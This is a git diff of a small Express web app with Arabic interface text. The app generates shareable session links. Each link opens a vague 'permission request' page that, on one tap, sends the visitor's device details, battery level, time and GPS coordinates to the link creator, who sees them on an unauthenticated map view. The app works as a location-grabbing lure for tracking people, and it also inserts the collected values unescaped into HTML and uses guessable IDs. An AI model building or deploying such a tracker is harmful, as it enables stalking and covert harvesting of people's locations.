@@ -1,5 +1,4 @@
 import express from "express"
-import { v4 as uuidv4 } from "uuid"
 
 const app = express()
 const PORT = process.env.PORT || 3000
@@ -8,9 +7,9 @@ app.use(express.json())
 
 let sessions = {}
 
-/* ============================= */
-/* 🔥 الصفحة الرئيسية */
-/* ============================= */
+/* ===================== */
+/* الصفحة الرئيسية */
+/* ===================== */
 
 app.get("/", (req,res)=>{
 
@@ -21,11 +20,6 @@ res.send(`
 <title>Dashboard</title>
 
 <style>
-
-*{
-box-sizing:border-box;
-}
-
 body{
 margin:0;
 font-family:Arial;
@@ -41,7 +35,6 @@ border:none;
 border-radius:8px;
 background:#22c55e;
 color:white;
-font-size:16px;
 cursor:pointer;
 }
 
@@ -50,25 +43,7 @@ background:#1e293b;
 padding:20px;
 border-radius:12px;
 margin-top:20px;
-word-break:break-word;
 }
-
-.session-item{
-background:#334155;
-padding:15px;
-border-radius:10px;
-margin-top:10px;
-text-align:left;
-}
-
-iframe{
-width:100%;
-height:400px;
-border-radius:12px;
-border:none;
-margin-top:10px;
-}
-
 </style>
 
 </head>
@@ -78,27 +53,18 @@ margin-top:10px;
 
 <button onclick="create()">إنشاء جلسة</button>
 
-<div id="sessions"></div>
+<div id="result"></div>
 
 <script>
 
 function create(){
 
-fetch('/create')
+fetch("/create")
 .then(r=>r.json())
 .then(data=>{
 
-let div=document.createElement("div")
-div.className="box"
-
-div.innerHTML=`
-<b>رابط الجلسة:</b><br>
-${data.link}
-<br><br>
-<b>المعلومات ستظهر هنا بعد الدخول</b>
-`
-
-document.getElementById("sessions").appendChild(div)
+document.getElementById("result").innerHTML = 
+"<div class='box'>رابط الجلسة:<br><br>"+data.link+"</div>"
 
 })
 
@@ -111,13 +77,13 @@ document.getElementById("sessions").appendChild(div)
 `)
 })
 
-/* ============================= */
-/* 🔥 إنشاء جلسة */
-/* ============================= */
+/* ===================== */
+/* إنشاء جلسة */
+/* ===================== */
 
 app.get("/create",(req,res)=>{
 
-let id = uuidv4().slice(0,6)
+let id = Math.random().toString(36).substring(2,8)
 
 sessions[id] = {}
 
@@ -127,65 +93,31 @@ link: req.protocol + "://" + req.get("host") + "/s/" + id
 
 })
 
-/* ============================= */
-/* 🔥 صفحة الإذن العربية */
-/* ============================= */
+/* ===================== */
+/* صفحة الإذن */
+/* ===================== */
 
 app.get("/s/:id",(req,res)=>{
 
 let id = req.params.id
 
 res.send(`
-
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>طلب إذن</title>
-
-<style>
-
-body{
-background:#0f172a;
-color:white;
-font-family:Arial;
-display:flex;
-justify-content:center;
-align-items:center;
-height:100vh;
-margin:0;
-text-align:center;
-}
-
-.card{
-background:#1e293b;
-padding:30px;
-border-radius:15px;
-width:90%;
-max-width:400px;
-}
-
-button{
-padding:12px;
-border:none;
-border-radius:8px;
-background:#22c55e;
-color:white;
-font-size:16px;
-cursor:pointer;
-width:100%;
-}
-
-</style>
+<title>Permission</title>
 </head>
 
-<body>
+<body style="background:#0f172a;color:white;text-align:center;padding:40px;font-family:Arial">
 
-<div class="card">
-<h2>📢 طلب إذن</h2>
-<p>نحتاج موافقتك لمشاركة معلومات الجهاز وموقعك لهذه الجلسة.</p>
+<h2>طلب إذن</h2>
 
-<button onclick="send()">موافق ومشاركة</button>
-</div>
+<p>نحتاج موافقتك لمشاركة معلومات الجهاز والموقع.</p>
+
+<button onclick="send()" 
+style="padding:12px 20px;border:none;border-radius:8px;background:#22c55e;color:white;cursor:pointer;">
+موافق
+</button>
 
 <script>
 
@@ -212,9 +144,7 @@ time:new Date().toLocaleString()
 })
 
 .then(()=>{
-
-document.body.innerHTML="<h2>✅ تم إرسال البيانات بنجاح</h2>"
-
+document.body.innerHTML="<h2>تم الإرسال بنجاح ✅</h2>"
 })
 
 })
@@ -227,25 +157,24 @@ document.body.innerHTML="<h2>✅ تم إرسال البيانات بنجاح</h2
 
 </body>
 </html>
-
 `)
 })
 
-/* ============================= */
-/* 🔥 استقبال البيانات */
-/* ============================= */
+/* ===================== */
+/* استقبال البيانات */
+/* ===================== */
 
 app.post("/collect",(req,res)=>{
 
 sessions[req.body.id] = req.body
 
-res.json({status:"ok"})
+res.json({ok:true})
 
 })
 
-/* ============================= */
-/* 🔥 عرض معلومات الجلسة تحت الرابط */
-/* ============================= */
+/* ===================== */
+/* عرض البيانات مع خريطة */
+/* ===================== */
 
 app.get("/view/:id",(req,res)=>{
 
@@ -256,48 +185,28 @@ return res.send("لا توجد بيانات")
 }
 
 res.send(`
-
 <html>
 <head>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Session Info</title>
-
-<style>
-body{
-background:#0f172a;
-color:white;
-font-family:Arial;
-padding:20px;
-}
-
-.box{
-background:#1e293b;
-padding:20px;
-border-radius:15px;
-word-break:break-word;
-}
-
-iframe{
-width:100%;
-height:400px;
-border-radius:12px;
-border:none;
-margin-top:15px;
-}
-
-</style>
+<title>Session</title>
 </head>
-<body>
 
-<div class="box">
+<body style="background:#0f172a;color:white;padding:20px;font-family:Arial">
+
 <h2>📊 معلومات الجلسة</h2>
+
+<div style="background:#1e293b;padding:20px;border-radius:12px">
 
 <p><b>الجهاز:</b><br>${data.device}</p>
 <p><b>البطارية:</b> ${data.battery}%</p>
 <p><b>الوقت:</b> ${data.time}</p>
-<p><b>الموقع:</b></p>
+
+<h3>📍 الموقع</h3>
 
 <iframe 
+width="100%" 
+height="400"
+style="border-radius:12px;border:none"
 src="https://www.google.com/maps?q=${data.lat},${data.lon}&output=embed">
 </iframe>
 
@@ -305,11 +214,8 @@ src="https://www.google.com/maps?q=${data.lat},${data.lon}&output=embed">
 
 </body>
 </html>
-
 `)
 })
-
-/* ============================= */
 
 app.listen(PORT,()=>{
 console.log("Server Running 🚀")
